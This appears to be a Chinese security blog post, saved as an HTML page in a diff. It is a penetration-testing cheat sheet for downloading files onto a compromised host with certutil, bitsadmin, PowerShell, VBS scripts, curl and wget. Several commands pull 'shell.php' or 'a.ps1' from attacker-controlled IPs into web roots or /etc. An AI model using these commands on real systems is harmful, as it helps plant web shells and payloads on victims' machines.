@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="文件下载前言对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。 Windows0x00 certutilcertutil.exe是一个命令行工具，作为Windows server 2003家族证书服务的一部分安装。 命令详解 certutil -urlcache -split -f http:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件下载">
+<meta property="og:url" content="http://140.143.122.13/posts/18452.html">
+<meta property="og:site_name" content="忆时光">
+<meta property="og:description" content="文件下载前言对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。 Windows0x00 certutilcertutil.exe是一个命令行工具，作为Windows server 2003家族证书服务的一部分安装。 命令详解 certutil -urlcache -split -f http:">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-08T03:29:44.000Z">
+<meta property="article:modified_time" content="2020-04-26T13:24:23.491Z">
+<meta property="article:author" content="ca5tle">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>文件下载</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/57592.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/2084.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://140.143.122.13/posts/18452.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://140.143.122.13/posts/18452.html&text=文件下载" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://140.143.122.13/posts/18452.html&is_video=false&description=文件下载" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=文件下载&body=Check out this article: http://140.143.122.13/posts/18452.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://140.143.122.13/posts/18452.html&name=文件下载&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://140.143.122.13/posts/18452.html&t=文件下载" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#文件下载"><span class="toc-number">1.</span> <span class="toc-text">文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">1.2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-certutil"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x00 certutil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-bitsadmin"><span class="toc-number">1.2.2.</span> <span class="toc-text">0x01 bitsadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-powersehll"><span class="toc-number">1.2.3.</span> <span class="toc-text">0x02 powersehll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-vbs"><span class="toc-number">1.2.4.</span> <span class="toc-text">0x03 vbs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">1.3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-curl"><span class="toc-number">1.3.1.</span> <span class="toc-text">0x00 curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-wget"><span class="toc-number">1.3.2.</span> <span class="toc-text">0x01 wget</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        文件下载
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">忆时光</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-08T03:29:44.000Z" itemprop="datePublished">2020-04-08</time>
+        
+        (Updated: <time datetime="2020-04-26T13:24:23.491Z" itemprop="dateModified">2020-04-26</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="0x00-certutil"><a href="#0x00-certutil" class="headerlink" title="0x00 certutil"></a>0x00 certutil</h3><p>certutil.exe是一个命令行工具，作为Windows server 2003家族证书服务的一部分安装。</p>
+<p><strong>命令详解</strong></p>
+<p>certutil -urlcache -split -f <a href="http://192.168.72.10/shell.php" target="_blank" rel="noopener">http://192.168.72.10/shell.php</a></p>
+<p>将shell.php下载当当前目录</p>
+<p>该命令适用于 server 2003以上版本</p>
+<h3 id="0x01-bitsadmin"><a href="#0x01-bitsadmin" class="headerlink" title="0x01 bitsadmin"></a>0x01 bitsadmin</h3><p>BITSAdmin是一个命令行工具，可用于创建下载或上传作业并监视其进度。</p>
+<p><strong>命令详解</strong></p>
+<p><code>bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.72.10/shell.php&quot; &quot;E:\phpstudy_pro\WWW\shell.php&quot;</code></p>
+<p>将shell.php下载到E:\phpstudy_pro\WWW\目录</p>
+<p>该命令适用于win 7以上版本</p>
+<h3 id="0x02-powersehll"><a href="#0x02-powersehll" class="headerlink" title="0x02 powersehll"></a>0x02 powersehll</h3><p><strong>命令详解</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell(<span class="built_in">new-object</span> Net.WebClient).DownloadFile(<span class="string">'http://192.168.72.10/shell.php'</span>,<span class="string">'E:\phpstudy_pro\WWW\shell.php'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将shell.php脚本下载到当前目录</p>
+<p>该命令适用于server 2003以上版本</p>
+<h3 id="0x03-vbs"><a href="#0x03-vbs" class="headerlink" title="0x03 vbs"></a>0x03 vbs</h3><ul>
+<li>第一种</li>
+</ul>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">"Msxml2.XMLHTTP"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo Post.Open <span class="string">"GET"</span>,<span class="string">"http://192.168.203.140/a.ps1"</span>,<span class="number">0</span> &gt;&gt;download.vbs</span><br><span class="line">echo Post.Send() &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Mode = <span class="number">3</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Type = <span class="number">1</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Open() &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.SaveToFile <span class="string">"D:/a.ps1"</span>,<span class="number">2</span> &gt;&gt;download.vbs</span><br></pre></td></tr></table></figure>
+
+<p>把下载地址直接echo输入download.vbs。直接下载即可</p>
+<p>该命令适用于server 2003以上版本</p>
+<ul>
+<li>第二种</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># echo <span class="keyword">set</span> a=<span class="built_in">createobject</span>(^<span class="string">"adod^"</span>+^<span class="string">"b.stream^"</span>):<span class="keyword">set</span> w=<span class="built_in">createobject</span>(^<span class="string">"micro^"</span>+^<span class="string">"soft.xmlhttp^"</span>):w.open^<span class="string">"get^"</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  &gt;&gt; downfile.vbs</span><br><span class="line"># cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1</span><br></pre></td></tr></table></figure>
+
+<p>保存脚本后再下载指定文件</p>
+<p>该命令适用于server 2003以上版本</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="0x00-curl"><a href="#0x00-curl" class="headerlink" title="0x00 curl"></a>0x00 curl</h3><p><strong>基本用法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure>
+
+<p>执行后，<a href="http://www.linux.com" target="_blank" rel="noopener">www.linux.com</a> 的html就会显示在屏幕上了</p>
+<p>保存访问的网页</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com &gt;&gt; linux.html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># curl -o linux.html http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-wget"><a href="#0x01-wget" class="headerlink" title="0x01 wget"></a>0x01 wget</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wget -p &#x2F;etc http:&#x2F;&#x2F;192.168.72.10&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>下载文件到 /etc 文件夹下</p>
+
+  </div>
+</article>
+
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
+            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#文件下载"><span class="toc-number">1.</span> <span class="toc-text">文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">1.2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-certutil"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x00 certutil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-bitsadmin"><span class="toc-number">1.2.2.</span> <span class="toc-text">0x01 bitsadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-powersehll"><span class="toc-number">1.2.3.</span> <span class="toc-text">0x02 powersehll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-vbs"><span class="toc-number">1.2.4.</span> <span class="toc-text">0x03 vbs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">1.3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-curl"><span class="toc-number">1.3.1.</span> <span class="toc-text">0x00 curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-wget"><span class="toc-number">1.3.2.</span> <span class="toc-text">0x01 wget</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://140.143.122.13/posts/18452.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://140.143.122.13/posts/18452.html&text=文件下载" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://140.143.122.13/posts/18452.html&is_video=false&description=文件下载" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=文件下载&body=Check out this article: http://140.143.122.13/posts/18452.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://140.143.122.13/posts/18452.html&title=文件下载" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://140.143.122.13/posts/18452.html&name=文件下载&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://140.143.122.13/posts/18452.html&t=文件下载" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2020
+    ca5tle
+	<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+	<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">你自己的备案号</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
